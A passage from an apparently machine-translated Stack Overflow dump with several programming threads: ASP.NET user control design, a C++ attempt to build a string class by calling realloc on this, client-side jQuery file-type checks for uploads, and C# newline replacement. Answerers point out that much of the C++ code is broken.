*   **Re-Use**: if one control is used across several pages, or has several instances on one page, its much easier to build it once and then re-use it several times. Thus, if you have common UI components that are re-used in many places, user controls can help you.

Of course there is a price to pay, each control has to expose properties that allow its parent containers to control it, and it has to expose events to notify its parents of some event occurring. Parent controls can also expose similar events and properties, but this adds a dependency on the parent control in the user control which may complicate re-use of the control in other containers.

If you can break down many parts of your page into logical components that have clearly defined separation of responsibility, then they are ideal candidates for user controls. Its just like when you are defining classes, and yat some point a class may become too complex and you decide to partition it into several smaller classes, only here there is a higher cost for each new class you define.

In my experience, user controls are great, just don't break down your controls to so many levels of depth to the point where you've created more complexity than the original bloated page. Try to find a happy medium where controls do just enough, not too much, and you don't have too many controls.

Here are some tutorials on user control communication
[http://www.codeproject.com/KB/user-controls/Page_UserControl.aspx](http://www.codeproject.com/KB/user-controls/Page_UserControl.aspx)
[http://aspalliance.com/1461_Page_and_User_Control_Communication](http://aspalliance.com/1461_Page_and_User_Control_Communication)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T19:01:46.223

控件应该公开事件，页面应该处理相同的事件并相应地更新网格视图。

打破控制纯粹是基于需要。如果您想重用将它们分解为控件。如果它像一个报废项目，则不需要特定的控制。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T19:11:44.827

There are 2 routes that you can take -

Route 1: Get OK from User/Stakeholder/Management/UAT, extract components from the page for better manageability, reuse etc.

Route 2: Think reusable components right from the beginning. Test your components/user controls/ custom controls/ web parts. Mix and match your components on web page and send for approval.

For most times you should not have any problem going Route 1, specially if your requirements keep changing and you dont have much time. You will get an understanding of UI requirements and analyze if you break the page into components, will the components require to communicate directly with each other or thru a DB etc.

Route 2 is where you are sure if you have enough requirements to indicate that certain UI/Behavior can be reused, will require independent testing etc.

At times its not very easy to directly jump to route 2\. If you have the domain experience, then sure.

Now in ASP.net world you even have to make a choice between Custom and User controls. Thats another decision you might have to make.

Hope this helps

Happy Coding!!

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T19:18:04.000

I would only break into separate controls if the code is going to be reused. Otherwise it is just a waste of time. I also try to create server controls if the html isn't easily managed in design mode, like code that generates breadcrumbs or navigation dynamically. A login form might be a good example of a user control.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T19:20:14.853

I've worked on projects at both extremes, from all functionality piled into one page to all functions having a dedicated usercontrol. At the very least, I recommend doing the following:

*   Site-wide design belongs in your masterpages
*   Functionality which appears on two or more pages should be encapsulated in a user control. (A login control, for example, might appear in several locations.)
*   Other functions is perfectly fine to embed in your aspx page.

The tricky part is getting communication right, which can be difficult when you have deeply nested layers of controls which need to communicate with one another, or when you have a control on a master page which needs to notify controls on a child page (if they exist). If you need communication between two or more levels of controls, use the following model:

```
                ProxyNotifier
            /                  \
   Control1                      Control2

```

In other words, Control1 and Control2 both have access to a ProxyNotifier instance. Control1 signals ProxyNotifer, and ProxyNotifer passes the signal to Control2.

A very simple implementation would look like this: (**CAUTION: untested code, not intended for production use**):

```
public static class ProxyNotifer
{
    // NOTE: This delegate should NOT be held in a static variable since
    // its session specific
    private static Action<string> NotifyEvent
    {
        get
        {
            if (!Session.ContainsKey["ProxyNotifyEvent"])
            {
                Session["ProxyNotifyEvent"] = null;
            }
            return Session["ProxyNotifyEvent"] as Action<string>;
        }
    }

    public static void Subscribe(Action<string> handler)
    {
        NotifyEvent += handler;
    }

    public static void Unsubscribe(Action<string> handler)
    {
        NotifyEvent -= handler;
    }

    public static void Invoke(string msg)
    {
        if (NotifyEvent != null) { NotifyEvent(msg); }
    }
}

public class Control1 : UserControl
{
    void SomethingHappened()
    {
        ProxyNotifyer.Invoke("Hello world!");
    }
}

public class Control2 : UserControl
{
    public Control2()
    {
        ProxyNotifer.Subscribe(Respond);
    }

    // ALWAYS unregister your event when your control is disposed, 
    // otherwise weirdness happens
    public void Dispose()
    {
        ProxyNotifier.Unsubscript(Respond);
        base.Dispose();
    }

    public void Respond(string msg)
    {
        lblMsg.Text = msg;
    }
} 
```

Now Control1 and Control2 can communicate no matter where they are on the page.

# c++ - Realloc()/在 C++ 中调整对象的大小以实现字符串

> ID：651698
> 
> 赞同：0
> 
> 时间：2009-03-16T18:55:53.197
> 
> 标签：c++, realloc

**当它们在内存中表示时，C++ 对象是否与 C 结构相同？**

例如，使用 C，我可以做这样的事情：

```
struct myObj {
       int myInt;
       char myVarChar;
};

int main() {
       myObj * testObj = (myObj *) malloc(sizeof(int)+5);
       testObj->myInt = 3;
       strcpy((char*)&testObj->myVarChar, "test");
       printf("String: %s", (char *) &testObj->myVarChar);
} 
```

我不认为 C++ 允许`+`为内置`char *`类型重载运算符。

所以我想创建我自己的轻量级字符串类，它没有额外的开销`std::string`。我认为`std::string`是连续表示的：

```
(int)length, (char[])data 
```

我想要完全相同的功能，但没有前缀长度（节省 8 个字节的开销）。

这是我用来测试的代码，但它会导致段错误

```
#include <iostream>
using namespace std;
class pString {
    public:
        char c;
        pString * pString::operator=(const char *);
};

pString * pString::operator=(const char * buff) {

    cout << "Address of this: " << (uint32_t) this << endl;
    cout << "Address of this->c: " << (uint32_t) &this->c << endl;

    realloc(this, strlen(buff)+1);
    memcpy(this, buff,  strlen(buff));
    *(this+strlen(buff)) = '\0';

    return this;
};

struct myObj {
        int myInt;
        char myVarChar;
};

int main() {

    pString * myString = (pString *) malloc(sizeof(pString));
    *myString = "testing";
    cout << "'" << (char *) myString << "'";    
} 
```

* * *

编辑：没有人真正了解我想做什么。是的，我知道我可以在类中有一个指向字符串的指针，但这比普通的 cstring 贵 8 个字节，我想要完全相同的内部表示。谢谢你的尝试

* * *

编辑：与使用 strcat 等相比，我想要实现的最终结果是能够使用 + 运算符而没有额外的内存使用

```
const char * operator+(const char * first, const char * second); 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-03-16T19:22:05.753

您不应该浪费时间编写字符串类 - 人们首先花时间编写它们是有原因的，并且认为他们编写它们是因为他们想要创建大的混淆和开销代码，您可以在几个小时内轻松改进这些代码是天真的.

例如，您的代码在赋值运算符中的内存重新分配具有二次复杂度 - 每个大于 1 个字符的字符串分配将使用一个大于 1 个字节的新内存块，从而在像这样的“少数”分配后导致大的内存碎片 - 你保存几个字节，但可能会丢失兆字节来地址空间和内存页面碎片。

同样以这种方式设计，您无法有效地实现 += 运算符，因为在大多数情况下，您将始终需要复制整个字符串，而不是仅复制附加的字符串 - 从而再次达到二次复杂度，以防您将小字符串附加到更大的字符串一个几次。

抱歉，但您的想法看起来很可能变得难以维护，并且效率比典型的字符串实现（如 std::string）低几个数量级。

别担心——这对于“编写自己的标准容器的更好版本”的所有伟大想法都是如此：)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-03-16T19:06:31.127

```
struct myObj {
   //...
   char myVarChar;
}; 
```

这行不通。你要么需要一个固定大小的数组，一个指向 char 的指针，要么使用 struct hack。您将无法分配指向 this 的指针`myVarChar`。

> 所以我想创建我自己的轻量级字符串类，它没有 std::string 的额外开销。

你指的是什么额外的开销？你有没有测试和测量，看看是否`std::string`真的是一个瓶颈？

> 我认为 std::string 是连续表示的

是的，主要是字符缓冲区部分。但是，以下内容：

> (int)长度(char[])数据

标准没有要求。已翻译：字符串实现不需要使用其数据的这种特定布局。它可能有额外的数据。

现在，您的轻量级字符串类充满了错误：

```
class pString {
public:
    char c; // typically this is implementation detail, should be private
    pString * pString::operator=(const char *); 
    // need ctors, dtors at least as well
    // won't you need any functions on strings?
}; 
```

尝试以下方法：

```
/* a light-weight string class */
class lwstring { 
  public:
     lwstring(); // default ctor
     lwstring(lwstring const&); // copy ctor
     lwstring(char const*); // consume C strings as well
     lwstring& operator=(lwstring const&); // assignment
     ~lwstring(); // dtor
     size_t length() const; // string length
     bool empty() const; // empty string?
  private:
     char *_myBuf;
     size_t _mySize;
}; 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-03-16T19:52:42.437

哇。您正在尝试做的是完全滥用 C++，如果它有效，将完全依赖于编译器，并且肯定有一天会让您进入 TheDailyWTF。

您收到段错误的原因可能是因为您的 operator= 正在将对象重新分配到不同的地址，但您没有更新 main 中的 myString 指针。在这一点上，我什至不愿称它为对象，因为从未调用过构造函数。

我认为您要做的是使 pString 成为指向字符串的更智能的指针，但是您做错了。让我试一试。

```
#include <iostream>
using namespace std;
class pString {
    public:
        char * c;
        pString & operator=(const char *);
        const char * c_str();
};

pString & pString::operator=(const char * buff) {

    cout << "Address of this: " << (uint32_t) this << endl;
    cout << "Address of this->c: " << (uint32_t) this->c << endl;

    c = (char *) malloc(strlen(buff)+1);
    memcpy(c, buff,  strlen(buff));
    *(c+strlen(buff)) = '\0';

    return *this;
};

const char * pString::c_str() {
    return c;
}

int main() {

    pString myString;
    myString = "testing";
    cout << "'" << myString.c_str() << "'"; 
```

}

现在我不会使用 malloc 而是使用 new/delete ，但我将其尽可能接近您的原始版本。

您**可能认为**您在浪费类中指针的空间，但事实并非如此——您正在用它来换取您之前保存在 main 中的指针。我希望这个例子能说明问题——变量大小相同，malloc/realloc 分配的额外内存量也相同。

```
pString myString;
char * charString;
assert(sizeof(myString) == sizeof(charString)); 
```

PS我应该指出，这段代码仍然需要做很多工作，它充满了漏洞。您需要一个构造函数来初始化指针，并需要一个析构函数在完成后释放它，这只是为了初学者。您也可以自己实现 operator+。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T19:09:52.790

您的类定义/用法有很多问题。如果要存储字符串，则应使用指针类型，例如 char* 成员，而不是单个 char。使用单个字符意味着只分配一个字符的内存。

另一个错误是在分配代码上执行 realloc - 您可能会更改分配的内存，但不能更改 this 的值。您必须将结果分配给 this 以实现此 ( `this = (*pString)realloc(this, strlen(buff+1));`)，无论如何这都是非常糟糕的做法。在 char* 成员上使用 realloc 会更好。

不幸的是，C++ 本身[没有 realloc 或 expand 的替代方法](http://yosefk.com/c++fqa/heap.html#fqa-16.5)，您必须使用 new 和 delete，自己进行任何复制。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-16T19:18:42.813

为什么你用 C 编写类，为什么不使用 C++？

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-03-16T18:58:46.060

您不能在 C 或 C++ 中更改对象/结构的大小。它们的大小在编译时是固定的。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-03-16T19:05:09.243

> 当它们在内存中表示时是对象 C++ 对象与 C 结构相同。

严格来说，没有。一般来说，是的。C++ 类和结构在内存布局上与 C 结构相同，除了：

*   位域有不同的打包规则
*   大小在编译时固定
*   如果有任何虚函数，编译器会在内存布局中添加一个 vtable 条目。
*   如果对象继承了基类，则新类的布局将附加到基类布局中，包括 vtable（如果有）。

> 我不认为 C++ 允许为内置的 char * 类型重载 + 运算符。所以我想创建我自己的轻量级字符串类，它没有 std::string 的额外开销。我认为 std::string 是连续表示的

`operator+`您可以为该`char*`类型创建重载。正常行为是指针算术。`std::string`重载`operator+`以将数据附加`char*`到字符串。该字符串作为 C 字符串以及附加信息存储在内存中。`c_str()`成员函数返回一个指向内部`char`数组的指针。

在您的 C 示例中，您依赖于未定义的行为。不`realloc`喜欢那样。它可能导致坏事——即奇怪的段错误。

您的 C++ 示例也在做`realloc(this)`​​ . 相反，您应该携带 a`char*`并获取一个`new char[]`缓冲区来存储字符而不是 a `realloc()`。此类 a`realloc`的行为未定义。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-03-16T21:59:17.593

我不认为“这个”像你认为的那样起作用。

具体来说，您*不能*重新分配 this 以指向成员函数中的更大缓冲区，因为调用该成员函数的任何内容仍然具有指向旧“this”的指针。由于它不是通过引用传递的，因此您无法更新它。

解决这个问题的明显方法是你的类应该持有一个指向缓冲区的指针并重新分配它。然而，重新实现一个字符串类是一个让自己很头疼的好方法。一个简单的包装函数可能会完成您想要的（假设“与使用 strcat 相比，能够使用 + 运算符而没有额外的内存使用”确实是您想要的）：

```
void concatenate(std::string& s, const char* c) {
    s.reserve(s.size() + strlen(c));
    s.append(c);
} 
```

无论如何，附加可能会在内部执行此操作。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-03-16T21:38:11.403

```
#include <iostream>
using namespace std;
class pString {
public:
    char c;
    pString * pString::operator=(const char *);
};

pString * pString::operator=(const char * buff) {

    cout << "Address of this: " << (uint32_t) this << endl;
    cout << "Address of this->c: " << (uint32_t) &this->c << endl;

    char *newPoint = (char *)realloc(this, strlen(buff)+1);
    memcpy(newPoint, buff,  strlen(buff));
    *((char*)newPoint+strlen(buff)) = '\0';

    cout << "Address of this After: " << (uint32_t) newPoint << endl;

    return (pString*)newPoint;
};

int main() {

    pString * myString = (pString *) malloc(sizeof(pString));
    *myString = "testing";

    cout << "Address of myString: " << (uint32_t) myString << endl;

    cout << "'" << (char *) myString << "'";    
} 
```

当 realloc 不重新分配指针时工作，即

> 此地址：1049008 此->c 的地址：1049008 此之后的地址：1049008 myString 的地址：1049008 'testing'

有效，但是当发生以下情况时它会失败

> this的地址：1049008 this->c的地址：1049008 this的地址After：1049024 myString的地址：1049008''

显而易见的解决方案是

```
this = (pString*) newPoint; 
```

但是编译器抱怨赋值中的左值无效。有没有人更新这个的正确方法（只是为了完整性，我怀疑我会使用代码，因为每个人似乎都讨厌它）。谢谢

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-03-16T20:13:22.730

您正在移动“this”指针。那是行不通的。我认为您真正想要的只是缓冲区的包装器。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-03-16T19:21:31.403

如果你想要的东西基本相同，`std::string`只是它不知道字符串有多长，你应该了解它是如何`std::string`工作的，它有什么运算符重载等等，然后模仿它，只需要你想要的差异。

然而，这不太可能有任何实际意义。

关于您的最新更新-您说您想要一个设计，其中通用应用程序代码将传递指向堆对象的裸指针。没有自动清理。

很简单，这是一个非常糟糕的主意。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2009-03-16T19:51:36.137

```
 #include <iostream>
    using namespace std;
    class pString {
        public:
            char c[1];
            pString * pString::operator=(const char *);
    };

    pString * pString::operator=(const char * buff) {

        cout << "Address of this: " << (uint32_t) this << endl;
        cout << "Address of this->c: " << (uint32_t) &this->c << endl;

        realloc(this->c, strlen(buff)+1);
        memcpy(this->c, buff,  strlen(buff));
        *(this->c+strlen(buff)) = '\0';

        return this;
    };

    struct myObj {
            int myInt;
            char myVarChar;
    };

    int main() {

        pString * myString = (pString *) malloc(sizeof(pString));
        *myString = "testing vijay";
        cout << "'" << ((char*)myString << "'";
    }

This should work. But its not advisable. 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2009-03-16T20:09:59.510

不要介意缺少 const 正确性，因为这是一个模型，但是这个怎么样：

```
class light_string {
public:
    light_string(const char* str) {
        size_t length = strlen(str);
        char*  buffer = new char[sizeof(size_t) + length + 1];

        memcpy(buffer, &length, sizeof(size_t));
        memcpy(buffer + sizeof(size_t), str, length);
        memset(buffer + sizeof(size_t) + length, 0, 1);

        m_str = buffer + sizeof(size_t);
    }

    ~light_string() {
        char* addr = m_str - sizeof(size_t);
        delete [] addr;
    }

    light_string& operator =(const char* str) {
        light_string s = str;
        std::swap(*this, s);

        return *this;
    }

    operator const char*() {
        return m_str;
    }

    size_t length() {
        return
            *reinterpret_cast<size_t *>(m_str - sizeof(size_t));
    }

private:
    char* m_str;
};

int main(int argc, char* argv[]) 
{
    cout<<sizeof(light_string)<<endl;

    return 0;
} 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2009-03-16T23:40:44.680

你想做的事情在 C++ 中不能也不能工作。您正在寻找的是灵活数组的 C99 功能。这在 C99 中很好用，原因有两个，首先你没有内置的构造函数，其次你没有继承（至少不是作为语言特性）。如果一个类从另一个类继承，则子类使用的内存被父类的内存打包，但是灵活的数组需要在结构/类的末尾。

```
class pString {
    char txt[];
}

class otherString : pString { // This cannot work because now the
    size_t len;               // the flexible array is not at the
}                             // end 
```

以 std::string 为例，它是由 C++ 专家编写的，我相信他们不会无缘无故遗漏一个“好把戏”。如果您仍然发现它们在您的程序中表现不佳，请改用纯 C 字符串，当然，它们不提供您想要的甜蜜 API。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2009-03-16T23:57:54.843

您不能重新分配 C++ 对象。正如其他人指出的那样`this`，您实际上并不是可以修改的指针，因此不能保证它将指向可以`realloc`访问的区域。

连接的一种解决方案是实现一个类层次结构，该层次结构将延迟真正的连接直到需要它。

像这样的东西

```
class MyConcatString;
class MyString {
public:
  MyString(const MyConcatString& c) {
    reserve(c.l.length()+c.r.lenght());
    operator = (l);
    operator += (r);   
  }
  MyConcatString operator + (const MyString& r) const {
    return MyConcatString(*this, r);
  }
};

class MyConcatString {
public:
  friend class MyString;
  MyConcatString(const MyString& l, const MyString& r):l(l), r(r) {};
  ...
  operator MyString () {
    MyString tmp;
    tmp.reserve(l.length()+r.length());
    tmp = l;
    tmp += r;
    return tmp;
  }
private:
  MyString& l;
  MyString& r;
} 
```

所以如果你有

```
MyString a = "hello";
MyString b = " world";
MyString c = a + b; 
```

将变成 MyString c = MyConcatString(a, b);

有关更多详细信息，请查看“C++ 编程语言”。

其他解决方案是将 char* 包装在结构中，但您似乎不喜欢这个想法。

但无论您选择何种解决方案，C++ 中的对象都无法重定位。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-03-16T19:23:00.933

如果你想要表现，你可以这样写你的类：

```
template<int max_size> class MyString
{
public:
   size_t size;
   char contents[max_size];

public:
   MyString(const char* data);
}; 
```

根据上下文将 max_size 初始化为适当的值。通过这种方式，对象可以在堆栈上创建，并且不涉及内存分配。

可以通过重载 new 运算符来创建您想要的内容：

```
class pstring
{
public:
    int myInt;
    char myVarchar;

    void* operator new(size_t size, const char* p);
    void operator delete(void* p); 
};

void* pstring::operator new(size_t size, const char* p)
{
    assert(sizeof(pstring)==size);
    char* pm = (char*)malloc(sizeof(int) + strlen(p) +1 );
    strcpy(sizeof(int)+pm, p);
    *(int*)(pm) = strlen(p);  /* assign myInt */
    return pm;
}

void pstring::operator delete(void* p)
{
    ::free(p);
}

pstring* ps = new("test")pstring;

delete ps; 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2009-03-16T23:20:02.033

此代码一团糟，不建议使用 RnR 和其他建议。但它适用于我想要它做的事情：

```
#include <iostream>
using namespace std;

struct pString {
        /* No Member Variables, the data is the object */ 
        /* This class cannot be extended & will destroy a vtable */
    public:
        pString * pString::operator=(const char *);
};

pString& operator+(pString& first, const char *sec) {

        int lenFirst;
        int lenSec = strlen(sec);
        void * newBuff = NULL;

        if (&first == NULL)
        {
            cout << "NULL" << endl;
            lenFirst = 0; 
            newBuff = malloc(sizeof(pString)+lenFirst+lenSec+1);
        } else {
            lenFirst = strlen((char*)&first);
            newBuff= (pString*)realloc(&first, lenFirst+lenSec+1);
        }

        if (newBuff == NULL)
        {
            cout << "Realloc Failed"<< endl;
            free(&first);
            exit(0);
        }       

        memcpy((char*)newBuff+lenFirst, sec, lenSec);
        *((char*)newBuff+lenFirst+lenSec) = '\0';

        cout << "newBuff: " << (char*)newBuff << endl;

        return *(pString*)newBuff;

};

pString * pString::operator=(const char * buff) {

    cout << "Address of this: " << (uint32_t) this << endl;

    char *newPoint = (char *)realloc(this, strlen(buff)+200);
    memcpy(newPoint, buff,  strlen(buff));
    *((char*)newPoint+strlen(buff)) = '\0';

    cout << "Address of this After: " << (uint32_t) newPoint << endl;

    return (pString*)newPoint;
};

int main() {

    /* This doesn't work that well, there is something going wrong here, but it's just a proof of concept */

    cout << "Sizeof: " << sizeof(pString) << endl;

    pString * myString = NULL;

    //myString = (pString*)malloc(1);
    myString = *myString = "testing";
    pString& ref = *myString;

    //cout << "Address of myString: " << myString << endl;

    ref = ref + "test";
    ref = ref + "sortofworks" + "another" + "anothers";

    printf("FinalString:'%s'", myString);

} 
```

# javascript - 如何让 jQuery 在上传时限制文件类型？

> ID：651700
> 
> 赞同：136
> 
> 时间：2009-03-16T18:56:34.427
> 
> 标签：javascript, jquery, file-upload, file-type

我想让 jQuery 将文件上传字段限制为仅 jpg/jpeg、png 和 gif。我已经在做后端检查了`PHP`。我`JavaScript`已经通过一个函数运行我的提交按钮，所以我真的只需要知道如何在提交或警告之前检查文件类型。

* * *

## 回答 #1

> 赞同：288
> 
> 时间：2009-03-16T19:03:33.037

您可以获得与任何其他字段相同的文件字段的值。但是，您无法更改它。

因此，**要从表面上**检查文件是否具有正确的扩展名，您可以执行以下操作：

```
var ext = $('#my_file_field').val().split('.').pop().toLowerCase();
if($.inArray(ext, ['gif','png','jpg','jpeg']) == -1) {
    alert('invalid extension!');
} 
```

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2012-11-28T00:11:48.037

仅此任务不需要插件。从其他几个脚本拼凑起来：

```
$('INPUT[type="file"]').change(function () {
    var ext = this.value.match(/\.(.+)$/)[1];
    switch (ext) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
            $('#uploadButton').attr('disabled', false);
            break;
        default:
            alert('This is not an allowed file type.');
            this.value = '';
    }
}); 
```

这里的技巧是将上传按钮设置为禁用，除非并且直到选择了有效的文件类型。

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2009-03-16T19:14:02.107

您可以使用 jQuery 的验证插件：http: [//docs.jquery.com/Plugins/Validation](http://docs.jquery.com/Plugins/Validation)

它恰好有一个 accept() 规则，可以满足您的需要： [http ://docs.jquery.com/Plugins/Validation/Methods/accept#extension](http://docs.jquery.com/Plugins/Validation/Methods/accept#extension)

请注意，控制文件扩展名不是防弹的，因为它与文件的 mimetype 没有任何关系。所以你可以有一个 .png 是一个 word 文档和一个 .doc 是一个完全有效的 png 图像。所以不要忘记在服务器端制作更多控件；）

* * *

## 回答 #4

> 赞同：25
> 
> 时间：2014-08-20T16:56:49.033

对于前端，如果您使用文件字段，则放置“**接受”属性非常方便。**

例子：

```
<input id="file" type="file" name="file" size="30" 
       accept="image/jpg,image/png,image/jpeg,image/gif" 
/> 
```

**几个重要的注意事项：**

*   [接受属性在 Internet Explorer 10、Firefox、Opera、Chrome 和 Safari 6 中受支持。](http://www.w3schools.com/tags/att_input_accept.asp)
*   [它将在来自不同浏览器的文件浏览器对话框中以不同方式显示文件扩展名的文本。](https://stackoverflow.com/questions/21534729/show-custom-text-for-applied-file-type-filters-on-file-dialog-to-upload-particul)

* * *

## 回答 #5

> 赞同：19
> 
> 时间：2013-02-28T14:41:00.330

不想检查 MIME 而不是用户撒谎的任何扩展？如果是这样，那么它少于一行：

```
<input type="file" id="userfile" accept="image/*|video/*" required /> 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-10-16T11:26:54.973

对于我的情况，我使用了以下代码：

```
 if (!(/\.(gif|jpg|jpeg|tiff|png)$/i).test(fileName)) {              
    alert('You must select an image file only');               
    } 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2014-12-11T09:29:29.063

我尝试编写工作代码示例，我对其进行测试并且一切正常。

野兔是代码：

**HTML：**

```
<input type="file" class="attachment_input" name="file" onchange="checkFileSize(this, @Model.MaxSize.ToString(),@Html.Raw(Json.Encode(Model.FileExtensionsList)))" /> 
```

**Javascript：**

```
 //function for check attachment size and extention match
function checkFileSize(element, maxSize, extentionsArray) {
    var val = $(element).val(); //get file value

    var ext = val.substring(val.lastIndexOf('.') + 1).toLowerCase(); // get file extention 
    if ($.inArray(ext, extentionsArray) == -1) {
        alert('false extension!');
    }

    var fileSize = ($(element)[0].files[0].size / 1024 / 1024); //size in MB
    if (fileSize > maxSize) {
        alert("Large file");// if Maxsize from Model > real file size alert this
    }
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-08-09T21:18:26.993

如果您正在处理多个 (html 5) 文件上传，我会采用最上面的建议评论并对其进行一些修改：

```
 var files = $('#file1')[0].files;
    var len = $('#file1').get(0).files.length;

    for (var i = 0; i < len; i++) {

        f = files[i];

        var ext = f.name.split('.').pop().toLowerCase();
        if ($.inArray(ext, ['gif', 'png', 'jpg', 'jpeg']) == -1) {
            alert('invalid extension!');

        }
    } 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-09-27T18:02:54.697

此代码工作正常，但唯一的问题是如果文件格式不是指定的选项，它会显示一条警告消息，但它会显示文件名，而它应该忽略它。

```
$('#ff2').change(
                function () {
                    var fileExtension = ['jpeg', 'jpg', 'pdf'];
                    if ($.inArray($(this).val().split('.').pop().toLowerCase(), fileExtension) == -1) {
                        alert("Only '.jpeg','.jpg','.pdf' formats are allowed.");
                        return false; }
}); 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2017-01-20T23:01:35.037

此示例仅允许上传 PNG 图像。

**HTML**

```
<input type="file" class="form-control" id="FileUpload1" accept="image/png" /> 
```

**JS**

```
$('#FileUpload1').change(
                function () {
                    var fileExtension = ['png'];
                    if ($.inArray($(this).val().split('.').pop().toLowerCase(), fileExtension) == -1) {
                        alert("Only '.png' format is allowed.");
                        this.value = ''; // Clean field
                        return false;
                    }
                }); 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-02-28T02:40:02.940

```
<form enctype="multipart/form-data">
   <input name="file" type="file" />
   <input type="submit" value="Upload" />
</form>
<script>
$('input[type=file]').change(function(){
    var file = this.files[0];
    name = file.name;
    size = file.size;
    type = file.type;
    //your validation
});
</script> 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-03-06T10:03:17.903

```
 $("input[name='btnsubmit']").attr('disabled', true);
    $('input[name="filphoto"]').change(function () {
    var ext = this.value.match(/\.(.+)$/)[1];
    switch (ext) 
    {
    case 'jpg':
    case 'jpeg':
    case 'png':
    case 'bmp':
        $("input[name='btnsubmit']").attr('disabled', false);
    break;
    default:
        alert('This is not an allowed file type.');
        $("input[name='btnsubmit']").attr('disabled', true);
        this.value = ''; 
```

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2013-12-26T11:45:47.963

```
function validateFileExtensions(){
        var validFileExtensions = ["jpg", "jpeg", "gif", "png"];
        var fileErrors = new Array();

        $( "input:file").each(function(){
            var file = $(this).value;
            var ext = file.split('.').pop();
            if( $.inArray( ext, validFileExtensions ) == -1) {
                fileErrors.push(file);
            }
        });

        if( fileErrors.length > 0 ){
            var errorContainer = $("#validation-errors");
            for(var i=0; i < fileErrors.length; i++){
                errorContainer.append('<label for="title" class="error">* File:'+ file +' do not have a valid format!</label>');
            }
            return false;
        }
        return true;
    } 
```

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2016-01-20T13:23:52.323

这是一个用于 javascript 验证的简单代码，验证后它将清理输入文件。

```
<input type="file" id="image" accept="image/*" onChange="validate(this.value)"/>

function validate(file) {
    var ext = file.split(".");
    ext = ext[ext.length-1].toLowerCase();      
    var arrayExtensions = ["jpg" , "jpeg", "png", "bmp", "gif"];

    if (arrayExtensions.lastIndexOf(ext) == -1) {
        alert("Wrong extension type.");
        $("#image").val("");
    }
} 
```

# c# - C# 中的 String.Replace(char, char) 方法

> ID：651702
> 
> 赞同：72
> 
> 时间：2009-03-16T18:56:49.433
> 
> 标签：c#, string

如何`\n`用空白空间替换？

如果我这样做，我会得到一个空的文字错误：

```
string temp = mystring.Replace('\n', ''); 
```

* * *

## 回答 #1

> 赞同：125
> 
> 时间：2009-03-16T19:01:38.097

`String.Replace('\n', '')`不起作用，因为`''`它不是有效的字符文字。

如果您使用 String.Replace(string, string) 覆盖，它应该可以工作。

```
string temp = mystring.Replace("\n", ""); 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-03-16T19:57:07.060

由于将“\n”替换为“”不会给您想要的结果，这意味着您应该替换的实际上不是“\n”，而是其他一些字符组合。

一种可能性是您应该替换的是“\r\n”字符组合，它是 Windows 系统中的换行符。如果您只替换“\n”（换行）字符，它将留下“\r”（回车）字符，这仍然可能被解释为换行符，具体取决于您显示字符串的方式。

如果字符串的源是系统特定的，则应使用该特定字符串，否则应使用 Environment.NewLine 获取当前系统的换行符组合。

```
string temp = mystring.Replace("\r\n", string.Empty); 
```

或者：

```
string temp = mystring.Replace(Environment.NewLine, string.Empty); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T18:59:26.933

这应该有效。

```
string temp = mystring.Replace("\n", ""); 
```

您确定原始字符串中有实际的 \n 新行吗？

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-11-15T15:12:56.103

```
string temp = mystring.Replace("\n", string.Empty).Replace("\r", string.Empty); 
```

显然，这会同时删除 '\n' 和 '\r' 并且就像我知道的那样简单。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-16T19:32:04.593

如果你使用

```
string temp = mystring.Replace("\r\n", "").Replace("\n", ""); 
```

那么你就不必担心你的字符串来自哪里。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-16T19:02:10.280

一个警告：在 .NET 中，换行符是“\r\n”。所以如果你从一个文件中加载你的文本，你可能不得不使用它而不是仅仅使用 "\n"

编辑> 正如 samuel 在评论中指出的那样，“\r\n”不是 .NET 特定的，而是 Windows 特定的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-16T19:50:50.897

创建这样的扩展方法怎么样......

```
 public static string ReplaceTHAT(this string s)
 {
    return s.Replace("\n\r", "");
 } 
```

然后当你想在任何你想要的地方替换它时，你可以这样做。

```
s.ReplaceTHAT(); 
```

最好的祝福！

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-11-27T04:21:26.307

这是你的确切答案...

```
const char LineFeed = '\n'; // #10
string temp = new System.Text.RegularExpressions.Regex(
                  LineFeed
              ).Replace(mystring, string.Empty); 
```

但是这个要好得多...特别是如果您尝试拆分行*（您也可以将其与拆分一起使用）*

```
